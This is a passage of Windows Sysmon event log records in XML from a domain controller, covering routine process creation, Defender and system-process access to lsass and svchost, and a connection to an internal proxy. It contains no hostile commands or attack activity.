<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:28:55.6219750Z"/>
    <EventRecordID>3289966</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:28:55.621</Data>
    <Data Name="ProcessGuid">{83eb9c06-79d7-65f8-6200-0010272d498c}</Data>
    <Data Name="ProcessId">5656</Data>
    <Data Name="Image">C:\Windows\System32\dllhost.exe</Data>
    <Data Name="FileVersion">10.0.20348.1</Data>
    <Data Name="Description">COM Surrogate</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">dllhost.exe</Data>
    <Data Name="CommandLine">dllhost.exe /Processid:{3EB3C877-1F16-487C-9050-104DBCD66683}</Data>
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">0</Data>
    <Data Name="IntegrityLevel">System</Data>
    <Data Name="Hashes">SHA1=30A1BB5B6488DA366EC6CB150CFBC5E1D38AE4EC,MD5=0CF8A7A200AB4EC5554D66B94C14DBF1,SHA256=7330E24D8462CB4C728FAFB454B8F7B81D74B116E290264CC3727466370C3B00,IMPHASH=32EF2A6E05BBEAE7E85E49CA7C70F08E</Data>
    <Data Name="ParentProcessGuid">{83eb9c06-43c6-65f0-1d02-0010ab917170}</Data>
    <Data Name="ParentProcessId">2340</Data>
    <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="ParentCommandLine">svchost.exe -k DcomLaunch</Data>
    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:29:18.7189714Z"/>
    <EventRecordID>3289967</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:29:18.718</Data>
    <Data Name="ProcessGuid">{83eb9c06-79ee-65f8-f700-001081b2edcd}</Data>
    <Data Name="ProcessId">5636</Data>
    <Data Name="Image">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="FileVersion">10.0.20348.1</Data>
    <Data Name="Description">WMI Provider Host</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">WmiPrvSE.exe</Data>
    <Data Name="CommandLine">WmiPrvSE.exe -secured -Embedding</Data>
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">0</Data>
    <Data Name="IntegrityLevel">System</Data>
    <Data Name="Hashes">SHA1=A5E3AF2A96B47DDFB49DA94A8671FB987C1FE2BB,MD5=7D26B8B7840F97C88857B470C235D9FE,SHA256=1066389BE1D488A653647CC3A656AC18A6219B4DDAFF89A68A5F31BACF2E0B3F,IMPHASH=7315DF3EBAFC67944E00B47EC7B4744A</Data>
    <Data Name="ParentProcessGuid">{83eb9c06-43c6-65f0-1d02-0010ab917170}</Data>
    <Data Name="ParentProcessId">2340</Data>
    <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="ParentCommandLine">svchost.exe -k DcomLaunch</Data>
    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:29:25.2038281Z"/>
    <EventRecordID>3289968</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:29:25.203</Data>
    <Data Name="ProcessGuid">{83eb9c06-437b-65f8-2b02-0010f73dd2cc}</Data>
    <Data Name="ProcessId">4300</Data>
    <Data Name="Image">C:\Windows\explorer.exe</Data>
    <Data Name="User">MERIDIANHCS\aisha.johnson</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:29:25.3667476Z"/>
    <EventRecordID>3289969</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:29:25.366</Data>
    <Data Name="ProcessGuid">{83eb9c06-437a-65f8-3500-0010051b4b40}</Data>
    <Data Name="ProcessId">4292</Data>
    <Data Name="Image">C:\Windows\System32\winlogon.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>10</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>10</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:29:46.6503446Z"/>
    <EventRecordID>3289971</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="1464"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:29:46.650</Data>
    <Data Name="SourceProcessGUID">{83eb9c06-43c2-65f0-5902-0010c99eda93}</Data>
    <Data Name="SourceProcessId">2252</Data>
    <Data Name="SourceThreadId">8428</Data>
    <Data Name="SourceImage">C:\Windows\System32\csrss.exe</Data>
    <Data Name="TargetProcessGUID">{83eb9c06-43c4-65f0-0802-001037d12df1}</Data>
    <Data Name="TargetProcessId">2336</Data>
    <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1000</Data>
    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9CCFF</Data>
    <Data Name="SourceUser">NT AUTHORITY\SYSTEM</Data>
    <Data Name="TargetUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:29:58.6569111Z"/>
    <EventRecordID>3289972</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:29:58.656</Data>
    <Data Name="ProcessGuid">{83eb9c06-7a16-65f8-1400-00007b508c69}</Data>
    <Data Name="ProcessId">5752</Data>
    <Data Name="Image">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="FileVersion">10.0.20348.1</Data>
    <Data Name="Description">WMI Provider Host</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">WmiPrvSE.exe</Data>
    <Data Name="CommandLine">WmiPrvSE.exe -secured -Embedding</Data>
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">0</Data>
    <Data Name="IntegrityLevel">System</Data>
    <Data Name="Hashes">SHA1=A5E3AF2A96B47DDFB49DA94A8671FB987C1FE2BB,MD5=7D26B8B7840F97C88857B470C235D9FE,SHA256=1066389BE1D488A653647CC3A656AC18A6219B4DDAFF89A68A5F31BACF2E0B3F,IMPHASH=7315DF3EBAFC67944E00B47EC7B4744A</Data>
    <Data Name="ParentProcessGuid">{83eb9c06-43c6-65f0-1d02-0010ab917170}</Data>
    <Data Name="ParentProcessId">2340</Data>
    <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="ParentCommandLine">svchost.exe -k DcomLaunch</Data>
    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>10</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>10</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:30:00.1553309Z"/>
    <EventRecordID>3289973</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:30:00.155</Data>
    <Data Name="SourceProcessGUID">{83eb9c06-43d5-65f0-f400-00003b51ab4f}</Data>
    <Data Name="SourceProcessId">2420</Data>
    <Data Name="SourceThreadId">9012</Data>
    <Data Name="SourceImage">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe</Data>
    <Data Name="TargetProcessGUID">{83eb9c06-43c4-65f0-0802-001037d12df1}</Data>
    <Data Name="TargetProcessId">2336</Data>
    <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1010</Data>
    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9C4AB|C:\Windows\SYSTEM32\KERNELBASE.dll+2E9B8|C:\Windows\SYSTEM32\advapi32.dll+4C156</Data>
    <Data Name="SourceUser">NT AUTHORITY\SYSTEM</Data>
    <Data Name="TargetUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:30:16.3569860Z"/>
    <EventRecordID>3289974</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:30:16.356</Data>
    <Data Name="ProcessGuid">{83eb9c06-7a28-65f8-aa00-00008f0f1e20}</Data>
    <Data Name="ProcessId">5704</Data>
    <Data Name="Image">C:\Windows\System32\conhost.exe</Data>
    <Data Name="FileVersion">10.0.20348.1</Data>
    <Data Name="Description">Console Window Host</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">conhost.exe</Data>
    <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">0</Data>
    <Data Name="IntegrityLevel">System</Data>
    <Data Name="Hashes">SHA1=A21F01CD47C2566A531DDDA6295C5F2729AEB2DD,MD5=D5DD0A35623D416B52F2DF3E64573716,SHA256=AD5D2369D2F142C551BF783A7F30D5BD9DE38C580046305DEDBBE7CD844E1905,IMPHASH=259D1C1188D5A01EADD9B3F236B1C61A</Data>
    <Data Name="ParentProcessGuid">{83eb9c06-43c2-65f0-5902-0010c99eda93}</Data>
    <Data Name="ParentProcessId">2252</Data>
    <Data Name="ParentImage">C:\Windows\System32\csrss.exe</Data>
    <Data Name="ParentCommandLine">csrss.exe</Data>
    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>10</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>10</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:30:25.6414233Z"/>
    <EventRecordID>3289975</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:30:25.641</Data>
    <Data Name="SourceProcessGUID">{83eb9c06-43d5-65f0-f400-00003b51ab4f}</Data>
    <Data Name="SourceProcessId">2420</Data>
    <Data Name="SourceThreadId">9012</Data>
    <Data Name="SourceImage">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe</Data>
    <Data Name="TargetProcessGUID">{83eb9c06-43c4-65f0-0802-001037d12df1}</Data>
    <Data Name="TargetProcessId">2336</Data>
    <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1400</Data>
    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9C4AB|C:\Windows\SYSTEM32\KERNELBASE.dll+2E9B8|C:\Windows\SYSTEM32\advapi32.dll+4C156</Data>
    <Data Name="SourceUser">NT AUTHORITY\SYSTEM</Data>
    <Data Name="TargetUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:30:30.9549429Z"/>
    <EventRecordID>3289976</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:30:30.954</Data>
    <Data Name="ProcessGuid">{83eb9c06-7a28-65f8-aa00-00008f0f1e20}</Data>
    <Data Name="ProcessId">5704</Data>
    <Data Name="Image">C:\Windows\System32\conhost.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>7</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>7</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:30:33.8303349Z"/>
    <EventRecordID>3289977</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="1464"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:30:33.830</Data>
    <Data Name="ProcessGuid">{83eb9c06-7491-65f8-b400-0010bcc168a9}</Data>
    <Data Name="ProcessId">5812</Data>
    <Data Name="Image">C:\Windows\System32\taskhostw.exe</Data>
    <Data Name="ImageLoaded">C:\Program Files\Windows Defender\MpOAV.dll</Data>
    <Data Name="FileVersion">4.18.2301.6</Data>
    <Data Name="Description">IOfficeAntiVirus Module</Data>
    <Data Name="Product">Microsoft Defender Antivirus</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">MpOAV.dll</Data>
    <Data Name="Hashes">SHA1=FC17FE09B96E6641A0C4DD89FE19E33173B862A9,MD5=DDBA590E19E88EA28373E3D47061E407,SHA256=11D3F5E67D04915646C72F60356E8ABB54A72F49B33A321C9E8622576EE491DD,IMPHASH=B50EDBF447D04C1BEFF75D2CC5E6EDF5</Data>
    <Data Name="Signed">true</Data>
    <Data Name="Signature">Microsoft Corporation</Data>
    <Data Name="SignatureStatus">Valid</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:31:07.0729877Z"/>
    <EventRecordID>3289978</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:31:07.072</Data>
    <Data Name="ProcessGuid">{83eb9c06-79ee-65f8-f700-001081b2edcd}</Data>
    <Data Name="ProcessId">5636</Data>
    <Data Name="Image">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>3</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>3</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:32:01.0214421Z"/>
    <EventRecordID>3289980</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:32:01.021</Data>
    <Data Name="ProcessGuid">{83eb9c06-43c6-65f0-5700-0010a70e8279}</Data>
    <Data Name="ProcessId">2368</Data>
    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
    <Data Name="User">NT AUTHORITY\NETWORK SERVICE</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">10.10.2.10</Data>
    <Data Name="SourceHostname">DC-01.meridianhcs.local</Data>
    <Data Name="SourcePort">62252</Data>
    <Data Name="SourcePortName">-</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">10.10.3.20</Data>
    <Data Name="DestinationHostname">PROXY-01.meridianhcs.local</Data>
    <Data Name="DestinationPort">8080</Data>
    <Data Name="DestinationPortName">http-alt</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>5</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:32:47.0054841Z"/>
    <EventRecordID>3289983</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="1464"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:32:47.005</Data>
    <Data Name="ProcessGuid">{83eb9c06-79d7-65f8-6200-0010272d498c}</Data>
    <Data Name="ProcessId">5656</Data>
    <Data Name="Image">C:\Windows\System32\dllhost.exe</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>10</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>10</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:32:50.9119476Z"/>
    <EventRecordID>3289984</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:32:50.911</Data>
    <Data Name="SourceProcessGUID">{83eb9c06-43d8-65f0-2002-001079fbde0e}</Data>
    <Data Name="SourceProcessId">2428</Data>
    <Data Name="SourceThreadId">9028</Data>
    <Data Name="SourceImage">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="TargetProcessGUID">{83eb9c06-43c6-65f0-a500-0010a9f570f0}</Data>
    <Data Name="TargetProcessId">2352</Data>
    <Data Name="TargetImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="GrantedAccess">0x1400</Data>
    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9C22E|C:\Windows\SYSTEM32\KERNELBASE.dll+2CF10|C:\Windows\SYSTEM32\combase.dll+29AA9</Data>
    <Data Name="SourceUser">NT AUTHORITY\NETWORK SERVICE</Data>
    <Data Name="TargetUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>10</EventID>
    <Version>3</Version>
    <Level>4</Level>
    <Task>10</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:34:06.0708328Z"/>
    <EventRecordID>3289988</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4732"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:34:06.070</Data>
    <Data Name="SourceProcessGUID">{83eb9c06-43d8-65f0-2002-001079fbde0e}</Data>
    <Data Name="SourceProcessId">2428</Data>
    <Data Name="SourceThreadId">9028</Data>
    <Data Name="SourceImage">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="TargetProcessGUID">{83eb9c06-43c6-65f0-a500-0010a9f570f0}</Data>
    <Data Name="TargetProcessId">2352</Data>
    <Data Name="TargetImage">C:\Windows\System32\svchost.exe</Data>
    <Data Name="GrantedAccess">0x0400</Data>
    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9C22E|C:\Windows\SYSTEM32\KERNELBASE.dll+2CF10|C:\Windows\SYSTEM32\combase.dll+29AA9</Data>
    <Data Name="SourceUser">NT AUTHORITY\NETWORK SERVICE</Data>
    <Data Name="TargetUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-03-18T17:34:34.8129934Z"/>
    <EventRecordID>3289989</EventRecordID>
    <Correlation/>
    <Execution ProcessID="2824" ThreadID="4208"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>DC-01.meridianhcs.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2024-03-18 17:34:34.812</Data>
    <Data Name="ProcessGuid">{83eb9c06-7b2a-65f8-e502-0010e96c348b}</Data>
    <Data Name="ProcessId">5800</Data>
    <Data Name="Image">C:\Windows\System32\conhost.exe</Data>
    <Data Name="FileVersion">10.0.20348.1</Data>
    <Data Name="Description">Console Window Host</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">conhost.exe</Data>
    <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7</Data>
    <Data Name="TerminalSessionId">0</Data>
    <Data Name="IntegrityLevel">System</Data>
    <Data Name="Hashes">SHA1=A21F01CD47C2566A531DDDA6295C5F2729AEB2DD,MD5=D5DD0A35623D416B52F2DF3E64573716,SHA256=AD5D2369D2F142C551BF783A7F30D5BD9DE38C580046305DEDBBE7CD844E1905,IMPHASH=259D1C1188D5A01EADD9B3F236B1C61A</Data>
    <Data Name="ParentProcessGuid">{83eb9c06-43c2-65f0-5902-0010c99eda93}</Data>
    <Data Name="ParentProcessId">2252</Data>
    <Data Name="ParentImage">C:\Windows\System32\csrss.exe</Data>
    <Data Name="ParentCommandLine">csrss.exe</Data>
    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
    
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>5</EventID>
